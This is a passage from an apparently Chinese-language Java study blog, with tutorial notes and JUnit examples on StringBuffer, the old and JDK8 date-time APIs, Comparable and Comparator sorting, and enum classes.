因为String不可变，所以优先用StringBuffer和StringBuilder，再考虑有无多线程问题...\n     *\n     *\n     *\n     *\n     *\n     *\n     *\n     *\n     */\n\n    @Test\n    public void test1(){\n        StringBuffer sb1 = new StringBuffer(\"aba\");\n        sb1.setCharAt(0, 'm');\n        System.out.println(sb1);\n    }\n\n    /**\n     * StringBuffer中常用方法\n     *关注：\n     * 增:append(xxx)\n     * 删:delete(int start, int end)\n     * 改:setCharAt(int n, char cn) / replace(int start, int end, String str)\n     * 查: charAt(int n)\n     * 插入:insert(int offset, xx)\n     * 长度:length()\n     * 遍历:for +里面用 charAt()   / toString() 查看内容\n     */\n    @Test\n    public void tets2(){\n        StringBuffer sb1 = new StringBuffer(\"aba\");\n        sb1.append(1);  //添加数据\n        sb1.append(\"aaa\");\n        sb1.delete(1,3); //删除索引内的字符（左闭右开）\n        sb1.replace(1,3, \"hello\"); //替换索引内的字符（左闭右开）\n        sb1.insert(2, \"H\"); //在索引位置插入数据，后面的数据后移\n        sb1.reverse(); //反转本身\n        System.out.println(sb1);\n        sb1.indexOf(\"H\");  //返回索引\n        String ss = sb1.substring(1,3);  //返回一个从start到end索引结束的左闭右开区间的子串\n        sb1.charAt(1); //\n\n        sb1.setCharAt(0, 'm');\n        System.out.println(sb1);\n\n    }\n\n\n    @Test\n    public void test3(){\n        //三者的效率：由高到低：StringBuilder >  StringBuffer > String\n    }\n\n}\n\n```\n\n\n\n> StringBuilder中常用方法是类似的，只不过加了同步方法\n\n\n\n\n\n\n\n#### 三者效率\n\n**由高到低：**StringBuilder >  StringBuffer > String\n\n\n\n### 时间类\n\n#### JDK8之前日期和之间API\n\n![JDK8之前日期和之间API](http://image.xpshuai.cn/JDK8%E4%B9%8B%E5%89%8D%E6%97%A5%E6%9C%9F%E5%92%8C%E4%B9%8B%E9%97%B4API.jpg)\n\n\n\n```java\npackage cn.xpshuai.java2;\n\nimport org.junit.Test;\n\nimport java.util.Date;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-19 17:19\n * @功能： JDK8之前日期和时间的API测试\n */\npublic class DateTimeAPI {\n//    1.System类中的currentTimeMillis()\n    @Test\n    public void test1() {\n        long time = System.currentTimeMillis();\n        //返回有计算机元年之间以毫秒为单位的时间差, 时间戳\n        System.out.println(time);\n    }\n\n    /**\n     * java.util.Date类\n     *       | --- java.sql.Date类(对应数据库中的日期类型的变量)\n     *\n     * java.util.Date类：\n     * 1.两个构造器的使用\n     * Date()\n     * Date(1611048522028L);\n     * 2.两个常用方法：\n     * getTime()：获取当前时间的时间戳\n     * toString()：显示当前时间\n     *\n     *\n     * java.sql.Date类\n     * 1.如何实例化\n     * 2.如果有sql.Date，如何转换为util.Date对象 -->多态赋值就行\n     * 3.util.Date，如何转换为sql.Date对象(父类往子类转)\n     *\n     *\n     */\n    @Test\n    public void test2() {\n//        构造器1\n        Date date1 = new Date();\n        System.out.println(date1.toString()); // Tue Jan 19 17:28:03 CST 2021\n        System.out.println(date1.getTime());  //long型是值，毫秒数，时间戳\n\n//        构造器2:创建指定毫秒数的Date对象\n        Date date2 = new Date(1611048522028L);\n        System.out.println(date2.toString()); // Tue Jan 19 17:28:03 CST 2021\n\n        //创建java.sql.Date对象\n        java.sql.Date date3 = new java.sql.Date(1611048522028L);\n        System.out.println(date3);\n\n        //util.Date，如何转换为sql.Date对象(父类往子类转)\n//        情况1\n//        Date date4 = new java.sql.Date(1611048522028L);\n//        java.sql.Date date5 = (java.sql.Date)date4;\n\n//        情况2：\n        Date date6 = new Date();\n        java.sql.Date date7 = new java.sql.Date(date6.getTime());\n\n    }\n}\n\n```\n\n\n\n**java.text.SimpleDateFormat类**\n\n- Date类的API不易于国际化，大部分被废弃了，`java.text.SimpleDateFormat`类是一个不与语言环境有关的方式来格式化和解析日期的具体类。\n\n- 它允许进行**格式化:日期→文本、解析:文本→日期**\n\n- **格式化:**\n\n  ```java\n  simpleDateFormat() :\t//默认的模式和语言环境创建对象\n  public SimpleDateFormat(String pattern):\t//该构造方法可以用参数pattern指定的格式创建一个对象，该对象调用:\n  public String format(Date date):\t//方法格式化时间对象date\n  ```\n\n- **解析:**\n\n  ```java\n  public Date parse(String source):\t//从给定字符串的开始解析文本，以生成一个日期\n  ```\n\n\n\n\n\n**java.util.Calendar类：**\n\n- Calendar是一个抽象基类，主用用于完成日期字段之间相互操作的功能.\n\n- 获取Calendar实例的方法\n\n  - 使用`Calendar.getInstance()`方法\n  - 调用它的子类`GregorianCalendar`的构造器。\n\n- 一个Calendar的实例是系统时间的抽象表示，通过`get(int field)`方法来取得想要的时间信息。比如YEAR、MONTH、DAY_OF_WEEK、HOUR_OF_DAYMINUTE、SECOND\n\n  ```java\n  public void set(int field,int value)\n  public void add(int field,int amount)\n  public final Date getTime()\n  public final void setTime(Date date)\n  ```\n\n  \n\n- 注意:\n\n  - 获取月份时:一月是0，二月是1，以此类推，12月是11\n  - 获取星期时:周日是1，周二是2，。。。。周六是7\n\n\n\n```java\npackage cn.xpshuai.java2;\n\nimport org.junit.Test;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Calendar;\nimport java.util.Date;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-23 21:35\n * @功能：\n *\n *\n * 1.system的currentTImeMills()\n * 2. java.util.Date和java.sql.Date\n * 3.java.util.SimpleDateFormat\n * 4.Calendar\n */\npublic class SimpleDateFormatTest {\n    /*\n    SimpleDateFormat: 对日期Date类的格式化和解析\n    格式化：日期-->字符串\n    解析: 字符串 --> 日期\n\n     */\n    @Test\n    public void testSimpleDateFormat() throws ParseException {\n        //实例化：使用默认构造器\n        SimpleDateFormat sdf = new SimpleDateFormat();\n        //格式化\n        Date date = new Date();\n        String format_Str = sdf.format(date);\n        System.out.println(format_Str);\n\n        //解析\n        String str = \"2020-12-30 上午8:11\";\n        Date date1 = sdf.parse(str);    //抛异常\n        System.out.println(date1);\n        System.out.println(date1.getTime());\n        System.out.println(\"**********\");\n\n\n        //实例化：调用带参构造器(开发中这么指定格式的方式用得多)\n        SimpleDateFormat sdf2 = new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\");\n        String str2 = sdf2.format(date);\n        System.out.println(str2);\n        //解析: 要求字符串必须符合通过构造器参数体现的这个实例的格式\n        System.out.println(sdf2.parse(\"2021-01-23 09:47:37\"));\n\n    }\n\n\n    /*\n    Calendar 日历类\n     */\n    @Test\n    public void testCalendar(){\n        //1.实例化\n        //方式1: 创建其子类(GregorianCalendar)的对象\n        //方式2: 调用它的静态方法: getInstance()  -- 常用\n        Calendar calendar = Calendar.getInstance();\n        System.out.println(calendar.getClass());\n\n        //2.常用方法\n        //get()\n        int days = calendar.get(Calendar.DAY_OF_MONTH); //当前时间是这个月的第几天\n        System.out.println(days);\n        System.out.println(calendar.get(Calendar.DAY_OF_YEAR)); // 当前是这个年的第几天\n\n        //set()\n        calendar.set(Calendar.DAY_OF_MONTH, 22); //修改值\n        int days2 = calendar.get(Calendar.DAY_OF_MONTH);\n        System.out.println(days2); //现在本身已经改了(可变的)\n\n        //add()\n        calendar.add(Calendar.DAY_OF_MONTH, 3); //在原基础加上三天\n        calendar.add(Calendar.DAY_OF_MONTH, -3); //在原基础减去三天\n\n        //getTime()：日历类-->Date\n        Date date = calendar.getTime(); //\n\n\n        //setTime(): Date --> 日历类\n        Date da = new Date();\n        calendar.setTime(da);\n        calendar.getTime();\n\n    }\n\n\n}\n\n```\n\n\n\n#### JDK8中的日期和之间API\n\n**新API出现背景：**\n\nJDK11之后java.util.DAta被启用了了。而Calendar并不比Date好多少。\n\n它们面临的问题是:\n\n可变性: 像日期和时间这样的类应该是不可变的。\n\n偏移性: Date中的年份是从1900开始的，而月份都从0开始。\n\n格式化: 格式化只对Date有用，Calendar则不行。\n此外，它们也不是线程安全的;不能处理闰秒等。\n\n**总结:**对日期和时间的操作一直是Java程序员最痛苦的地方之一。\n\n\n\n\n\n**新时间日期API：**\n\n- 第三次引入的API是成功的，并且Java8中引入的java.time API已经纠正了过去的缺陷，将来很长一段时间内它都会为我们服务。\n- Java 8吸收了Joda-Time 的精华，以一个新的开始为Java创建优秀的API.新的java.time中包含了所有关于**本地日期(LocalDate) 、本地时间(LocalTime) 、本地日期时间(LocalDateTime)、时区 (ZonedDateTime和持续时间(Duration）的类。**历史悠久的Date类新增了tolnstant()方法,用于把 Date转换成新的表示形式。这些新增的本地化时间日期API大大简化了日期时间和本地化的管理。\n\n```java\njava.time -包含值对象的基础包\njava.time.qhrono-提供对不同的日历系统的访问\njava.time.format-格式化和解析时间和日期\njava.time.temporal-包括底层框架和扩展特性\njava.time.zone-包含时区支持的类\n```\n\n- LocalDate、LocalTime、LocalDateTime类是其中较重要的几个类，它们的实例是**不可变的对象**，分别表示使用ISO-8601日历系统的日期、时间、日期和时间。它们提供了简单的本地日期或时间，并不包含当前的时间信息，也不包含与时区相关的信息。\n  - LocalDate代表IOS格式(yyyy-MM-dd）的日期,可以存储生日、纪念日等日期\n  - LocalTime表示一个时间，而不是日期。\n  - LocalDateTime是用来表示日期和时间的，这是一个最常用的类之一。\n\n\n\n\n\n\n\n![java新时间API的方法](http://image.xpshuai.cn/java%E6%96%B0%E6%97%B6%E9%97%B4API%E7%9A%84%E6%96%B9%E6%B3%95.jpg)\n\n\n\n```java\n    /*\n    LocalDate, LocalTime, LocalDateTime(使用较多)\n    类似于Calendar\n     */\n    @Test\n    public void test_LocalXXX(){\n        //实例化1:\n        //now() 获取当前日期或时间\n        LocalDate ldate = LocalDate.now();\n        LocalTime ltime = LocalTime.now();\n        LocalDateTime ldatetime = LocalDateTime.now(); //使用的较多\n\n        System.out.println(ldate);\n        System.out.println(ltime);\n        System.out.println(ldatetime);\n\n        //实例化2: of() 设置指定时间, 参数没有偏移量\n        LocalDateTime nowtime = LocalDateTime.of(2020,10,10,8,8,8);\n        System.out.println(nowtime);\n        System.out.println(\"*******\");\n\n\n        //getXXX() 获取\n        System.out.println(ldatetime.getDayOfMonth()); // 获取时间是本月的第几天\n        System.out.println(ldatetime.getDayOfWeek());\n        System.out.println(ldatetime.getDayOfYear());\n        System.out.println(ldatetime.getMonthValue()); //获取月份\n        System.out.println(ldatetime.getMinute());\n\n        //withXXX() 设置\n        // 这种设置是不可变的\n        LocalDate localDate1 = ldate.withDayOfMonth(10); //修改设置值，修改当前是月的第几天\n        System.out.println(localDate1); //它改了\n        System.out.println(ldate); //原来的不受影响\n\n        LocalDateTime ll = ldatetime.withHour(5);\n\n        //加\n        LocalDateTime lll = ldatetime.plusMonths(3); //在原来基础上加上了三个月\n        System.out.println(lll); //加了之后的\n        System.out.println(ldatetime); //原来的还是不变的\n\n        //减\n        LocalDateTime llll = ldatetime.minusDays(6); //减去6天\n        System.out.println(llll);\n    }\n\n```\n\n\n\n\n\n**Instant(瞬时)：**\n\n![Instant](http://image.xpshuai.cn/java%E6%97%B6%E9%97%B4-instant.jpg)\n\n\n\n```java\n    Instant只是简单的表示自元年开始的秒\n    类似java.util.Date\n     */\n    @Test\n    public void testInstant(){\n        //now()  获取本初子午线对应的标准时间\n        Instant instant = Instant.now();\n        System.out.println(instant); //默认时间是不对的，按UTC时间算是在本初子午线位置的时间，咱在东八区需要加一下\n\n        // 我们采用这种方式，添加时间的偏移量\n        OffsetDateTime offsetDateTime = instant.atOffset(ZoneOffset.ofHours(8)); //东八区\n        System.out.println(offsetDateTime);\n\n        //获取毫秒数  --> Date.getTime()\n        long mi = instant.toEpochMilli();\n        System.out.println(mi);\n\n        //\n        //通过给定的毫秒数，获取Instant实例 --> Date(Long millis)\n        Instant instant2 = Instant.ofEpochMilli(1611413025604L);\n        System.out.println(instant2);\n\n    }\n\n\n```\n\n\n\n\n\n**格式化与解析日期或时间：**\n\n![格式化与解析日期或时间](http://image.xpshuai.cn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8E%E8%A7%A3%E6%9E%90%E6%97%A5%E6%9C%9F%E6%88%96%E6%97%B6%E9%97%B4.jpg)\n\n\n\n```java\n    /*\n    DateTimeFormatter: 格式化或解析日期或时间\n    类似于SimpleDateFormat\n     */\n    @Test\n    public void testDateTimeFormatter(){\n//        LocalDateTime, LocalDate, LocalTime\n        //实例化1：预定义的标准格式\n        DateTimeFormatter formatter1 = DateTimeFormatter.ISO_LOCAL_DATE_TIME;\n        //格式化:日期-->str\n        LocalDateTime localDateTime = LocalDateTime.now();\n        String str1 = formatter1.format(localDateTime);\n        System.out.println(str1);\n        //解析: str-->日期\n        TemporalAccessor parse = formatter1.parse(\"2021-01-23T22:51:32.392\");\n\n\n        //实例化2：本地化相关的格式(以某个函数或参数举例)\n//        ofLocalizedDateTime,ofLocalizedDate\n        DateTimeFormatter formatter2 = DateTimeFormatter.ofLocalizedDateTime(FormatStyle.LONG);\n        //格式化\n        String str2 = formatter2.format(localDateTime);\n\n//        ofLocalizedDate\n        DateTimeFormatter formatter3 = DateTimeFormatter.ofLocalizedDate(FormatStyle.FULL);\n        String str3 = formatter3.format(LocalDate.now());\n        System.out.println(str3);\n\n        //解析...\n\n        //实例化3：自定义的格式(使用的最多 -->重点)\n        DateTimeFormatter format1 = DateTimeFormatter.ofPattern(\"yyyy-MM-dd hh:mm:ss\");\n        //格式化\n        String s1 = format1.format(LocalDateTime.now());\n        System.out.println(s1);\n        //解析\n        TemporalAccessor accessor = format1.parse(\"2020-8-8 08:08:08\");\n        System.out.println(accessor);\n    }\n\n```\n\n\n\n**java其他时间api：**\n\n![java其他时间api](http://image.xpshuai.cn/java%E5%85%B6%E4%BB%96%E6%97%B6%E9%97%B4api.jpg)\n\n\n\n**与传统日期的处理转换：**\n\n![与传统日期的处理转换](http://image.xpshuai.cn/%E4%B8%8E%E4%BC%A0%E7%BB%9F%E6%97%A5%E6%9C%9F%E7%9A%84%E5%A4%84%E7%90%86%E8%BD%AC%E6%8D%A2.jpg)\n\n\n\n> 用到的时候查一下就行\n\n\n\n\n\n### Java比较器(重要)\n\n> 涉及到对象排序，就要用下面两种，至于用哪种就自己选吧\n>\n> java.lang.Comparable 一劳永逸，一旦实现，在任何位置都可以比较大小\n>\n> java.util.Comparator   临时用一下时候的比较\n\n\n\n![自然排序1](http://image.xpshuai.cn/%E8%87%AA%E7%84%B6%E6%8E%92%E5%BA%8F1.jpg)\n\n\n\n#### Comparable\n\n```java\npackage cn.xpshuai.java3;\n\nimport org.junit.Test;\n\nimport java.util.Arrays;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-24 17:07\n * @功能： Java比较器\n *\n * Java中的对象，正常情况下只能进行比较；==, !=, 不能使用: >   <\n * 但是在开发场景中，我们需要对多个对象进行排序可以比较大小\n *实现对象排序的方式有两种：\n * - 自然排序: java.lang.Comparable\n * - 定制排序: java.util.Comparator\n *\n *\n * 1.Comparable接口\n *\n *\n * 2.Comparator接口\n */\npublic class ComparableTest {\n\n    /*\n    Comparable使用举例\n    1.String等包装类实现了Comparable接口，重写了compareTo()方法,给出了比较两个对象大小的实现\n    2.String等包装类重写compareTo()以后，进行了从小到大排列\n    3.实现compareTo()的规则:\n        如果当前对象this大于形参对象，则返回正整数；\n        如果当前对象this小于形参对象，则返回负整数；\n        如果当前对象this等于形参对象obj，则返回0。\n     */\n    @Test\n    public void test1(){\n        String[] arr = new String[]{\"DD\", \"GG\", \"BB\", \"JJ\",\"MM\",\"AA\"};\n        Arrays.sort(arr); //排序(其实也是String实现了Comparable接口)\n\n    }\n\n\n}\n \n```\n\n\n\n#### 自定义类实现Comparable自然排序\n\n自定义类：\n\n```java\npackage cn.xpshuai.java3;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-24 17:26\n * @功能：\n */\npublic class Goods implements Comparable{\n    private String name;\n    private double price;\n\n    public Goods() {\n    }\n\n    public Goods(String name, double price) {\n        this.name = name;\n        this.price = price;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public double getPrice() {\n        return price;\n    }\n\n    public void setPrice(double price) {\n        this.price = price;\n    }\n\n    @Override\n    public String toString() {\n        return \"Goods{\" +\n                \"name='\" + name + '\\'' +\n                \", price=\" + price +\n                '}';\n    }\n\n    //实现这个方法\n    //指明商品比较大小的方式(这里自定义比较价格从低到高排序，如果需要，可以继续嵌套比较)\n    @Override\n    public int compareTo(Object o) {\n        if(o instanceof  Goods){\n            Goods goods = (Goods)o;\n            if(this.price > goods.price){\n                return 1;\n            }else if(this.price < goods.price){\n                return -1;\n            }else {\n//                return 0;\n                 return this.name.compareTo(goods.name); //如果需要，可以继续嵌套比较, 比如价格一样就再比较商品名称\n            }\n        }\n        throw new RuntimeException(\"传入的数据类型不一致!\");\n    }\n}\n\n```\n\n```java\npackage cn.xpshuai.java3;\n\nimport org.junit.Test;\n\nimport java.util.Arrays;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-24 17:07\n * @功能： Java比较器\n *\n * Java中的对象，正常情况下只能进行比较；==, !=, 不能使用: >   <\n * 但是在开发场景中，我们需要对多个对象进行排序可以比较大小\n *实现对象排序的方式有两种：\n * - 自然排序: java.lang.Comparable\n * - 定制排序: java.util.Comparator\n *\n *\n * 1.Comparable接口\n *\n *\n * 2.Comparator接口\n */\npublic class ComparableTest {\n\n    /*\n    Comparable(自然排序)使用举例\n    1.String等包装类实现了Comparable接口，重写了compareTo()方法,给出了比较两个对象大小的实现\n    2.String等包装类重写compareTo()以后，进行了从小到大排列\n    3.实现compareTo()的规则:\n        如果当前对象this大于形参对象，则返回正整数；\n        如果当前对象this小于形参对象，则返回负整数；\n        如果当前对象this等于形参对象obj，则返回0。\n     4.对于自定义类，如果需要排序，可以让自定义类实现Comparable接口，重写compareTo()方法\n     在compareTo(obj)写如何排序\n     */\n    @Test\n    public void test1(){\n        String[] arr = new String[]{\"DD\", \"GG\", \"BB\", \"JJ\",\"MM\",\"AA\"};\n        Arrays.sort(arr); //排序(其实也是String实现了Comparable接口)\n\n    }\n\n    /*\n    【自定义类实现Comparable自然排序】\n    这里自定义类是Goods.java\n\n     对于自定义类，如果需要排序，可以让自定义类实现Comparable接口，重写compareTo()方法\n     在compareTo(obj)写如何排序\n     */\n    @Test\n    public void test2(){\n        Goods[] arr = new Goods[4];\n        arr[0] = new Goods(\"联想\", 65);\n        arr[1] = new Goods(\"小米\", 12);\n        arr[2] = new Goods(\"华为\", 65);\n        arr[3] = new Goods(\"罗技\", 101);\n\n        Arrays.sort(arr);  //原始情况下，不能执行，需要在自定义类中实现并重写\n        System.out.println(Arrays.toString(arr));  // 继承并重写之后\n\n    }\n\n}\n\n```\n\n\n\n\n\n#### Comparator接口\n\n![定制排序2](http://image.xpshuai.cn/%E5%AE%9A%E5%88%B6%E6%8E%92%E5%BA%8F2.jpg)\n\n\n\n```java\n    /*\n    Comparator接口(定制排序)\n    1.背景:\n    当元素的类型没有实现java.Lang.ComparabLe接口而又不方便修改代码,\n    或者实现了java.Lang.comparable接口的排序规则不适合当前的操作,\n    那么可以考怎使用Comparator的对象来排序\n    2.重写compare(Object o1,0bject o2)方法，比较o1和o2的大小:\n        如果方法返回正整数,则表示o1大于o2\n        如果方法返回负整数,则表示o1小于o2\n        如果方法返回0,则表示o1等于o2\n\n     */\n    @Test\n    public void test3() {\n        String[] arr = new String[]{\"DD\", \"GG\", \"BB\", \"JJ\",\"MM\",\"AA\"};\n        Arrays.sort(arr, new Comparator<String>() { //使用匿名内部类\n            @Override\n            public int compare(String o1, String o2) { //实现compare方法\n                //指明o1和o2怎么排\n                if(o1 instanceof String && o2 instanceof String){\n                    String s1 = (String)o1;\n                    String s2 = (String)o2;\n\n                    return -s1.compareTo(s2); //从大到小来排列\n                }\n\n                throw new RuntimeException(\"输入的类型不一致\");\n            }\n        });\n    }\n```\n\n\n\n#### 自定义类实现Comparator定制排序\n\n自定义类:\n\n```java\n// Goods类，同前面\n```\n\n\n\n```java\n    /*\n    【自定义类实现Comparator定制排序】\n    这里自定义类是Goods.java\n\n     */\n    @Test\n    public void test4(){\n        Goods[] arr = new Goods[4];\n        arr[0] = new Goods(\"联想\", 65);\n        arr[1] = new Goods(\"小米\", 12);\n        arr[2] = new Goods(\"华为\", 65);\n        arr[3] = new Goods(\"罗技\", 101);\n        arr[3] = new Goods(\"罗技\", 100);\n\n        Arrays.sort(arr, new Comparator<Goods>() {\n            //指明商品比较大小的方式(这里自定义, 先按产品名称从低到高，再比较价格从高到低排序)\n            @Override\n            public int compare(Goods o1, Goods o2) {\n                if(o1 instanceof  Goods && o2 instanceof  Goods){\n                    Goods goods1 = (Goods)o1;\n                    Goods goods2 = (Goods)o2;\n                    if(goods1.getName().equals(goods2.getName())){\n                        return -Double.compare(goods1.getPrice(), goods2.getPrice()); //如果名称一样，就再比较价格\n                    }else {\n                        return goods1.getName().compareTo(goods2.getName());\n                    }\n                }\n                throw new RuntimeException(\"传入的数据类型不一致!\");\n            }\n        });  //原始情况下，不能执行，需要在自定义类中实现并重写\n        System.out.println(Arrays.toString(arr));  // 继承并重写之后\n\n    }\n\n\n```\n\n\n\n\n\n### System类\n\n![System类](http://image.xpshuai.cn/javaSystem%E7%B1%BB.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n### Math类\n\n![Math类](http://image.xpshuai.cn/javaMath%E7%B1%BB.jpg)\n\n\n\n\n\n\n\n\n\n### BigInteger与BigDecimal\n\n![BigInteger与BigDecimal](http://image.xpshuai.cn/javaBigInteger%E4%B8%8EBigDecimal.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["时间类"],"categories":["Java学习"]},{"title":"Java学习之枚举类","url":"%2Fposts%2F31393%2F","content":"\n#### 概述\n\n- **枚举类的实现**\n  - JDK1.5之前需要自定义枚举类\n  - JDK 1.5新增的**enum关键字**用于定义枚举类\n- 若枚举只有一个对象,则可以作为一种单例模式的实现方式。\n- **枚举类的属性**\n  - **枚举类对象的属性不应允许被改动,所以应该使用private final修饰**\n  - 枚举类的使用private final修饰的属性应该在构造器中为其赋值\n  - 若枚举类显式的定义了带参数的构造器,则在列出枚举值时也必须对应的传入公数\n\n#### 定义枚举类(两种方式)\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-24 18:18\n * @功能：枚举类\n *\n * 类的对象只有有限个、确定的。我们称此类为枚举类\n * 当需要定义一组常量时，强烈建议使用枚举类\n * 如果枚举类中只有一个对象，则可以作为单例模式的实现方式。\n *\n *\n * 如何定义枚举类\n * 方法1：jdk5.0之前：之定义枚举类\n * 方法2：jdk5.0，可以使用enum关键字定义枚举类(常用)\n */\npublic class EnumTest {\n    public static void main(String[] args) {\n        Season spring = Season.SPRING;\n        System.out.println(spring);\n\n\n\n        // //jdk5.0，可以使用enum关键字定义枚举类(常用)\n        //定义的枚举类继承于java.lang.Enum\n        Season1 spring1 = Season1.SPRING;\n        System.out.println(spring1);\n        System.out.println(Season1.class.getSuperclass());\n\n    }\n\n\n}\n\n\n//jdk5.0之前：自定义枚举类\nclass Season{\n    //1.声明Season对象的属性\n    private final String seasonName;\n    private final String seasonDesc;\n\n    //2.私有化类的构造器, 并给对象属性赋值\n    private Season(String seasonName, String seasonDesc){\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc;\n    }\n\n    //3.提供当前枚举类的对象的多个对象  public static final\n    public static final Season SPRING = new Season(\"春天\", \"春暖花开\");\n    public static final Season SUMMER = new Season(\"夏天\", \"夏日炎炎\");\n    public static final Season AUTOM = new Season(\"秋天\", \"秋高气爽\");\n    public static final Season WINTER = new Season(\"冬天\", \"冰天雪地\");\n\n    //4.其他诉求：获取枚举类对象的属性\n    public String getSeasonName() {\n        return seasonName;\n    }\n\n    public String getSeasonDesc() {\n        return seasonDesc;\n    }\n\n    //4.其他诉求：提供toString()\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"seasonName='\" + seasonName + '\\'' +\n                \", seasonDesc='\" + seasonDesc + '\\'' +\n                '}';\n    }\n\n\n\n}\n\n\n// //jdk5.0，可以使用enum关键字定义枚举类(常用)\nenum Season1{\n//    1.提供当前枚举类的帝乡，多个对象之间用,隔开\n    SPRING(\"春天\", \"春暖花开\"),\n    SUMMER(\"夏天\", \"夏日炎炎\"),\n    AUTOM(\"秋天\", \"秋高气爽\"),\n    WINTER(\"冬天\", \"冰天雪地\");\n\n    //2.声明Season对象的属性\n    private final String seasonName;\n    private final String seasonDesc;\n\n    //2.私有化类的构造器, 并给对象属性赋值\n    private Season1(String seasonName, String seasonDesc){\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc;\n    }\n\n    //3.提供当前枚举类的对象的多个对象  public static final\n\n\n    //4.其他诉求：获取枚举类对象的属性\n    public String getSeasonName() {\n        return seasonName;\n    }\n\n    public String getSeasonDesc() {\n        return seasonDesc;\n    }\n\n    //4.其他诉求：提供toString()\n\n}\n\n\n```\n\n\n\n\n\n#### Enum类的主要方法\n\n![Enum类的主要方法](http://image.xpshuai.cn/JavaEnum%E7%B1%BB%E7%9A%84%E4%B8%BB%E8%A6%81%E6%96%B9%E6%B3%95.png)\n\n![image-20210125164002288](C:\\Users\\19401\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210125164002288.png)\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-24 18:18\n * @功能：枚举类\n *\n * 类的对象只有有限个、确定的。我们称此类为枚举类\n * 当需要定义一组常量时，强烈建议使用枚举类\n * 如果枚举类中只有一个对象，则可以作为单例模式的实现方式。\n *\n *\n * 如何定义枚举类\n * 方法1：jdk5.0之前：之定义枚举类\n * 方法2：jdk5.0，可以使用enum关键字定义枚举类(常用)\n *\n *\n * Enum中常用方法：\n * value()  返回枚举类型的对象数据\n * valueOf()  可以把一个字符串转为对应的枚举类对象（要求字符串必须是枚举类对象的\"名字\"）\n * toString()  返回当前枚举类对象常量的名称\n */\npublic class EnumTest {\n    public static void main(String[] args) {\n        Season spring = Season.SPRING;\n        System.out.println(spring);\n\n\n\n        // //jdk5.0，可以使用enum关键字定义枚举类(常用)\n        //定义的枚举类继承于java.lang.Enum\n        Season1 spring1 = Season1.SPRING;\n        // toString()\n        System.out.println(spring1);\n        System.out.println(Season1.class.getSuperclass());\n\n        //values()\n        Season1[] values = Season1.values();\n        for (int i = 0; i < values.length; i++) {\n            System.out.println(values[i]);\n        }\n\n\n        // valueOf(String objName): 根据提供objName, 返回枚举类中对象名是objName的对象\n        // 如果没有，则抛出异常\n        Season1 winter = Season1.valueOf(\"WINTER\");\n        System.out.println(winter);\n\n    }\n\n\n}\n\n\n//jdk5.0之前：自定义枚举类\nclass Season{\n    //1.声明Season对象的属性\n    private final String seasonName;\n    private final String seasonDesc;\n\n    //2.私有化类的构造器, 并给对象属性赋值\n    private Season(String seasonName, String seasonDesc){\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc;\n    }\n\n    //3.提供当前枚举类的对象的多个对象  public static final\n    public static final Season SPRING = new Season(\"春天\", \"春暖花开\");\n    public static final Season SUMMER = new Season(\"夏天\", \"夏日炎炎\");\n    public static final Season AUTOM = new Season(\"秋天\", \"秋高气爽\");\n    public static final Season WINTER = new Season(\"冬天\", \"冰天雪地\");\n\n    //4.其他诉求：获取枚举类对象的属性\n    public String getSeasonName() {\n        return seasonName;\n    }\n\n    public String getSeasonDesc() {\n        return seasonDesc;\n    }\n\n    //4.其他诉求：提供toString()\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"seasonName='\" + seasonName + '\\'' +\n                \", seasonDesc='\" + seasonDesc + '\\'' +\n                '}';\n    }\n\n\n\n}\n\n\n// //jdk5.0，可以使用enum关键字定义枚举类(常用)\nenum Season1{\n//    1.提供当前枚举类的帝乡，多个对象之间用,隔开\n    SPRING(\"春天\", \"春暖花开\"),\n    SUMMER(\"夏天\", \"夏日炎炎\"),\n    AUTOM(\"秋天\", \"秋高气爽\"),\n    WINTER(\"冬天\", \"冰天雪地\");\n\n    //2.声明Season对象的属性\n    private final String seasonName;\n    private final String seasonDesc;\n\n    //2.私有化类的构造器, 并给对象属性赋值\n    private Season1(String seasonName, String seasonDesc){\n        this.seasonName = seasonName;\n        this.seasonDesc = seasonDesc;\n    }\n\n    //3.提供当前枚举类的对象的多个对象  public static final\n\n\n    //4.其他诉求：获取枚举类对象的属性\n    public String getSeasonName() {\n        return seasonName;\n    }\n\n    public String getSeasonDesc() {\n        return seasonDesc;\n    }\n\n}\n\n```\n\n\n\n\n\n#### 使用enum关键字定义的枚举类实现接口\n\n\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-24 18:18\n * @功能：枚举类\n *\n * 类的对象只有有限个、确定的。我们称此类为枚举类\n * 当需要定义一组常量时，强烈建议使用枚举类\n * 如果枚举类中只有一个对象，则可以作为单例模式的实现方式。\n *\n *\n * 如何定义枚举类\n * 方法1：jdk5.0之前：之定义枚举类\n * 方法2：jdk5.0，可以使用enum关键字定义枚举类(常用)\n *\n *\n * Enum中常用方法：\n * value()  返回枚举类型的对象数据\n * valueOf()  可以把一个字符串转为对应的枚举类对象（要求字符串必须是枚举类对象的\"名字\"）\n * toString()  返回当前枚举类对象常量的名称\n *\n *\n *\n *\n * 使用enum关键字定义的枚举类实现接口：\n *情况1：实现接口，在enum类中实现抽象方法\n *情况2：让枚举类的对象分别实现接口中的抽象方法\n *\n */\npublic class EnumTest {\n    public static void main(String[] args) {\n        Season spring = Season.SPRING;\n        System.out.println(spring);\n\n\n\n        // //jdk5.0，可以使用enum关键字定义枚举类(常用)\n        //定义的枚举类继承于java.lang.Enum\n        Season1 spring1 = Season1.SPRING;\n        // toString()\n        